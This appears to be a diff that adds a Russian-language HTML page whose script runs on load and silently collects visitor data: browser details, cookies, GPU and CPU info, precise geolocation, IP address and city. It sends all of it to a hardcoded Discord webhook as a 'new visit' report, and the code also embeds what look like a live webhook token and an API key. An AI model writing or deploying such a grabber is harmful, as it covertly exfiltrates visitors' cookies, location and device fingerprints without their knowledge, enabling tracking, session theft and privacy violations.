@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Сбор и отправка информации в Discord</title>
+</head>
+<body>
+  <h2>Сбор данных о пользователе и отправка в Discord</h2>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1362813647230996801/cKD_F5qkq1M55RkHo_XY31AG09U0grLFlv1EI94d_Cej5FBrx1obgUY2JQJJLFf4VTrS';
+
+    async function getIPInfo() {
+    try {
+      const apiKey = 'd1313fed1b0048d1a054addb35e63933'; // Замените на ваш ключ
+      const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
+      if (!res.ok) return null;
+      return await res.json();
+    } catch (err) {
+      console.warn("Не удалось получить IP-инфо", err);
+      return null;
+    }
+  }
+
+    function getUserAgentInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        onlineStatus: navigator.onLine ? 'Онлайн' : 'Оффлайн',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: document.cookie || 'Нет cookies'
+      };
+    }
+
+    function getGPUInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return 'WebGL недоступен';
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (!debugInfo) return 'Инфо недоступно';
+      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    }
+
+    function getCPUCores() {
+      return navigator.hardwareConcurrency || 'Неизвестно';
+    }
+
+    function getGeoLocation() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const { latitude, longitude } = position.coords;
+            resolve({ latitude, longitude });
+          },
+          error => reject('Геолокация отклонена или недоступна')
+        );
+      });
+    }
+
+    async function sendInfoToDiscord() {
+      const now = new Date().toLocaleString('ru-RU');
+      const userAgentInfo = getUserAgentInfo();
+      const ipInfo = await getIPInfo();
+      const geoLocation = await getGeoLocation().catch(err => err);
+
+      const content = `👤 Новый визит на сайт!
+
+🕒 Время: ${now}
+💻 Браузер: ${userAgentInfo.userAgent}
+🧱 Платформа: ${userAgentInfo.platform}
+🗣️ Язык: ${userAgentInfo.language}
+🖥️ Разрешение экрана: ${userAgentInfo.screenResolution}
+🌐 Статус сети: ${userAgentInfo.onlineStatus}
+🕓 Часовой пояс: ${userAgentInfo.timezone}
+🍪 Cookies: ${userAgentInfo.cookies}
+🖥️ GPU: ${getGPUInfo()}
+⚙️ Ядер процессора: ${getCPUCores()}
+🌍 Геолокация: ${geoLocation.latitude}, ${geoLocation.longitude}
+
+🌍 IP: ${ipInfo ? ipInfo.ip : 'Не доступно'}
+📍 Город: ${ipInfo ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}` : 'Не доступно'}
+`;
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content })
+      })
+      .then(res => {
+        if (!res.ok) {
+          console.warn("Не удалось отправить:", res.status);
+        }
+      })
+      .catch(err => {
+        console.error("Ошибка при отправке в Discord:", err);
+      });
+    }
+
+    sendInfoToDiscord();
+  </script>
+</body>
+</html>
